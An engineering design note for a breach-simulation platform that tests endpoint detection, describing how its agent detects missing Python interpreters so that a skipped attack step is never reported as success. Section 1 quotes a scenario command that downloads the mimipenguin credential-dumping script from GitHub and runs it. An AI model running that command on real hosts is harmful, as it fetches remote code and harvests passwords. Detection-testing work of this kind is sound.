# Agent runtime dependencies — a missing interpreter must never present as success

**Status:** implemented, verified live against `deploy/tier-d/` (2026-08-30).

## 1. The problem, with evidence

`SIM-EDR-001` step 5 downloads the real `mimipenguin.sh` and runs it:

```
curl -sSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh \
  -o /tmp/mimipenguin.sh \
  && chmod +x /tmp/mimipenguin.sh \
  && timeout 30 bash /tmp/mimipenguin.sh 2>&1 | tee /tmp/mimi_output.txt \
  || echo '[*] Mimipenguin execution complete'
```

`mimipenguin.sh` shells out to `python`/`python2`/`python3` internally (verified against
upstream `huntergregal/mimipenguin/master/mimipenguin.sh`, lines 34–45). On a target with
no interpreter of any kind, it dies with `Error: No supported version of 'python' found`.
The step's own `|| echo '[*] ... complete'` is a non-fatal fallback — `tee` in the pipeline
already exits 0 regardless of what mimipenguin does, so the whole line exits 0 no matter
what.

Measured on a real pull-mode run before this fix (`deploy/tier-d/TIER-D-RUN-REPORT.md`,
§1.2): the step reported `exit_code=0`, the Tier-D harness classified it `OK`, and the tool
the step downloaded never actually ran. In a POV report, this step's absent detections read
as "Cortex missed it." Nothing was ever executed for Cortex to miss — a manufactured false
negative *inside the execution path*, not in a customer's stack.

This was first "fixed" by adding `python3` to `deploy/tier-d/Dockerfile.target`. That fixes
the lab and fixes nothing on a customer host, whose package set this repo does not control
and must not silently mutate. That workaround is reverted by this change.

## 2. What the operator asked for

> the agent should either deliver system updates, or provide a python path into the local
> agent runtime environment

Read literally against the actual failure mode:

- **"deliver system updates"** — the beacon may, if explicitly authorized for this run,
  attempt a package-manager install to satisfy the missing interpreter.
- **"provide a python path into the local agent runtime environment"** — if a compatible
  interpreter exists on the host under a *different* name (extremely common: many modern
  distributions ship `python3` but not the bare `python` some tools still hardcode), the
  beacon can expose it under the requested name via a scoped `PATH` entry, without touching
  the host.

Both are real, both are implemented. Neither can fabricate an interpreter that genuinely
does not exist and cannot be installed — that case is refused, honestly, every time.

## 3. Non-negotiables (repeated here because they drove every design choice)

1. **A missing runtime dependency must never present as success.** Detection comes first.
2. **No public-internet egress required on the target.** The payload shelf exists for
   exactly this reason (`docs/reference/payload-shelf.md`).
3. **Never silently mutate a customer host.** Any install is explicit, per-run opt-in,
   recorded, and off by default — `CORTEXSIM_XSIAM_ALLOW_WRITE`'s posture, not a new one.
4. **Do not fake it.** No stubbed interpreter, no suppressed error.

## 4. Options considered

### A. Fix the scenario's shell fallback
Rewrite `|| echo '... complete'` to a stricter check. Rejected as the *whole* fix: it is
scenario-local (169 other scenarios can make the same authoring mistake tomorrow), and it
still leaves the beacon with no way to *provide* an interpreter — it can only detect and
refuse. Kept as an *outcome* (the beacon now refuses to run the masking command at all,
which is strictly stronger than fixing the fallback's wording) but not the mechanism.

### B. Extend the payload shelf to stage a portable Python interpreter
Named explicitly as a plausible direction in the brief, and the first one investigated.
**Rejected for this pass, deliberately, and the reasoning is load-bearing:**

- A real, self-contained CPython (e.g. `python-build-standalone`'s `install_only` tarball)
  is a *directory tree* — `bin/`, `lib/`, the stdlib — not a single file.
- `docs/reference/payload-shelf.md` §11 documents that `kind: archive` is **rejected** by
  the adapter loader today, and states plainly why: *no consumer can unpack one*. The Go
  beacon's `Artifact` struct has no `Kind` field. The K8s init container is `wget`+`mv` on
  an image without `unzip`. `scripts/build-payloads.sh` hard-fails on an archive.
- Building archive support into the shelf, the beacon, the K8s init container *and* the
  console — safely, for arbitrary interpreter distributions — is a multi-track feature on
  the scale of the shelf itself, not a slice of this task. Attempting it here would produce
  exactly the "half-built version of everything" this task explicitly asks not to ship.

This remains the correct direction for a *fully air-gapped* target that has neither Python
under any name nor a usable package manager. It is called out below as explicitly unsolved.

### C. Beacon-side capability reporting + orchestrator preflight + live execution-time gate
**Chosen.** Three cooperating pieces, all real, all tested:

1. The beacon detects which interpreters it can actually find (exact name or a known
   alias — e.g. `python3`, `python3.11`, … for the logical name `python`) and reports this
   at registration time, the same way it already reports `capabilities`.
2. The orchestrator can compare a scenario's declared per-step interpreter needs against a
   target agent's last-known roster **before** dispatch — a target-readiness preflight,
   which did not exist at all (`/api/connectors/{kind}/preflight` only answers "is my
   *tenant* reachable"). This is **advisory** — see §6.
3. **The enforcement that actually matters** lives in the beacon, at the moment of
   execution, on the real target: before running a step that declares
   `requires_interpreters`, the beacon re-resolves the requirement for real. If it is
   satisfied only under an alias, the beacon builds a throwaway directory containing a
   symlink named exactly the requested logical name (e.g. `python` → the real
   `/usr/bin/python3`), prepends it to `PATH` for that one subprocess, and runs the step's
   real command — genuinely, not stubbed. If it is not satisfied at all, and the run was
   not authorized to install it, **the step's command is never executed.** The beacon
   synthesizes a distinguishable result instead (`exit_code=127`, a stable
   `RUNTIME_DEPENDENCY_MISSING` marker in stderr) and moves on through the exact same
   fail-fast / abort / SSE / `/complete` path every other step result uses — no special
   casing downstream. If the run *was* authorized (see §5), the beacon detects the host's
   package manager (`apt-get` → `dnf` → `yum` → `apk`, in that order) and composes
   `<install> && (<original command>)` — so an install failure surfaces as *this step's*
   honest non-zero exit rather than being absorbed by whatever fallback the scenario author
   wrote.

Chosen because it is the only option that satisfies all four non-negotiables *and* is
buildable, testable, and provable within this task: no new wire format for tool bytes, no
archive support, nothing that assumes egress, and the one enforcement point that matters
(the beacon, at the real moment of execution, on the real target) needed the least new
surface area to get exactly right.

## 5. Implementation

### Scenario authoring
`StepSchema.requires_interpreters: list[str]` (optional, back-compat, default `[]`) —
`core/engine/scenario_loader.py`. `SIM-EDR-001` step 5 now declares
`requires_interpreters: ["python"]`. Documented in `scenarios/_schema.yml`.

### The beacon (`agent/`)
- `agent/executor/interpreter.go` — `ResolveInterpreter`, `DetectInterpreters`,
  `InterpreterShim`, `InstallPackageCommand`. No network calls; every check is a real
  `exec.LookPath` against the host's real `PATH`.
- `agent/beacon/client.go::resolveRuntimeDeps` — the one function all three execution paths
  (`executeTask`, `executeTaskChained`, `executeTaskPerStep`) call before turning a step
  into a real subprocess. Returns either a (possibly PATH-shimmed or install-prefixed)
  command to run for real, or a `blocked` outcome carrying a synthetic, never-executed
  result.
- `BeaconClient.Register` now also sends `interpreters` — the beacon's own live
  `executor.AvailableLogicalNames()` snapshot — alongside `capabilities`.

### SimCore (`core/`)
- `core/engine/runtime_preflight.py` — pure comparison logic (`evaluate_runtime_readiness`),
  no I/O. Used by the launch path and by a new read endpoint.
- `GET /api/agents/{agent_id}/preflight?scenario_id=...` — "can this host run this
  scenario?", the target-readiness preflight the brief notes did not exist.
- `Agent.interpreters` (JSON column) — the beacon's advertised roster, persisted at
  `POST /api/agents/register` / `/enroll`.
- `Run.runtime_install_authorized` (bool, default `False`) and
  `Run.runtime_dependency_gaps` (JSON, `None` = never checked, `[]` = checked and clean) —
  both set at launch and queryable from the run record afterward.
- The two-key gate, `orchestrator.launch()`: `runtime_install_authorized =
  allow_runtime_install(request) AND CORTEXSIM_AGENT_ALLOW_RUNTIME_INSTALL(deployment)`.
  Exactly `CORTEXSIM_XSIAM_ALLOW_WRITE`'s posture — a single mis-set request body can never
  authorize a target mutation on its own. Threaded onto `Task.runtime_install_authorized`,
  omitted from the wire when `False` (byte-identical for every run that never touches this).

### `deploy/tier-d/`
- `Dockerfile.target` — the `python3` workaround is **reverted**, with a comment explaining
  why, so Tier-D keeps proving the real mechanism instead of a lab-only patch.
- `classify.py` — a new `ENVIRONMENT` signature, `RUNTIME_DEPENDENCY_MISSING`, so the
  harness's own taxonomy recognizes the new marker.

## 6. What this explicitly does NOT solve

- **A fully air-gapped target with no Python under any name and no usable package
  manager (or one pointed at nothing reachable).** The only remaining lever there is
  Option B (shelf-staged interpreter), scoped out in §4 as its own multi-track feature.
  Today that target correctly gets an honest, visible refusal — never a silent success —
  which is the floor this task set out to guarantee, not the ceiling.
- **The orchestrator-side preflight is advisory, not authoritative.** `Agent.interpreters`
  is a snapshot from the last registration; it can go stale. This is intentional — the
  beacon's live, execution-time check is the actual enforcement (§4.C item 3), and nothing
  about staleness in the advisory layer can produce a false success, only a slower-to-warn
  one.
- **Windows.** `resolveRuntimeDeps` is a deliberate no-op on `GOOS=="windows"`. No scenario
  in the corpus currently declares a Windows step with `requires_interpreters`, and
  PowerShell's own interpreter story (and package-manager landscape) is different enough
  that folding it into this pass would have diluted the POSIX fix. Flagged, not silently
  dropped: a Windows step that *did* declare a requirement today passes through unchanged,
  i.e. it gets the pre-existing (unmasked) behavior, not a new guarantee.
- **The package→interpreter mapping is small and hand-maintained**
  (`agent/executor/interpreter.go`'s `interpreterPackage`, currently `python`, `perl`,
  `ruby`, `node`). A wrong guess there would silently install the wrong thing under real
  operator authorization, so it is deliberately narrow rather than heuristic.
- **No automated drift guard between the Go alias table and the Python one.** Both exist
  (`agent/executor/interpreter.go`'s `interpreterAliases`,
  `core/engine/runtime_preflight.py`'s `INTERPRETER_ALIASES`) and are kept in sync by hand.
  A drift here can only widen or narrow the *advisory* preflight signal (§ above) — it
  cannot cause a false success, because the beacon re-resolves for real regardless.

## 7. Verification

See `docs/design/agent-runtime-dependencies-report.md` for the full RED/GREEN test log and
the live `deploy/tier-d/` run transcripts (default-refused and opt-in-installed) proving
this end to end against a real target container with no Python installed.
